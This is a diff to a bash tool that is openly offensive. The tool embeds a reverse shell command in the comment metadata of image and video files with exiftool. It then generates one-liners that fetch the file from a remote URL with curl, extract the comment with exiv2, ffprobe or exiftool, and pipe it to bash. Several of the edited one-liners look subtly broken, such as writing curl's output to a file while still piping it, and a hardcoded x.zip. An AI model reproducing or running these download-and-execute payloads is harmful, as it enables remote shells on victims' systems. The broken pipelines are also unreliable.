@@ -87,6 +87,7 @@ file_extension="${filename##*.}"
 
 if contains_element "$file_extension" "$media_compatibility"; then
     echo -e "\e[95mInjecting reverse shell into media file...\e[0m"
+    echo "Executing: exiftool -Comment=\"$command\" \"$filename\""
     exiftool -Comment="$command" "$filename"
     echo -e "\e[95mMedia file command injection method completed.\e[0m"
 elif contains_element "$file_extension" "$text_compatibility"; then
@@ -97,7 +98,7 @@ else
     allowed_extensions=("zip" "rar")  
 
     if contains_element "$file_extension" "${allowed_extensions[*]}"; then
-        echo -e "\e[36mWarning: The file extension '$file_extension' is not available at this moment.\e[0m"
+        echo -e "\e[36mWarning: The file extension '$file_extension' is not in the compatibility lists but is allowed.\e[0m"
     else
         echo -e "\e[91mError: File extension not supported.\e[0m"
         show_help
@@ -130,7 +131,7 @@ case "$method_choice" in
         ;;
     2)
         echo -e "\e[37mGenerating one-liner method with exiv2..."
-        one_liner="curl -s '$url/$filename' -o temp.jpg | exiv2 -p c temp.jpg | bash"
+        one_liner="curl -s '$url/$filename' -o $filename | exiv2 -p c $filename | bash"
         echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
         ;;
     3)
@@ -150,7 +151,7 @@ case "$method_choice" in
         ;;
     6)
         echo -e "\e[37mGenerating one-liner method with ffprobe..."
-        one_liner="curl -s '$url/$filename' -o temp.mp4 | ffprobe temp.mp4 -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
+        one_liner="curl -s '$url/$filename' -o $filename | ffprobe $filename -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
         echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
         ;;
     7)
@@ -161,7 +162,7 @@ case "$method_choice" in
     8)
         echo -e "\e[37mGenerating one-liner method with exiftool for extracting the reverse shell injected on the image/video file..."
         read -p "Enter the name of the file inside the ZIP archive: " filename2
-        one_liner="curl -s '$url/$filename' | exiftool $filename / $filename2 -Comment -b -echo | bash"
+        one_liner="curl -s '$url/$filename' -o $filename && unzip -p x.zip $filename2 > $filename2 && exiftool -Comment -b $filename2 | bash && rm $filename2"
         echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
         ;;
     *)
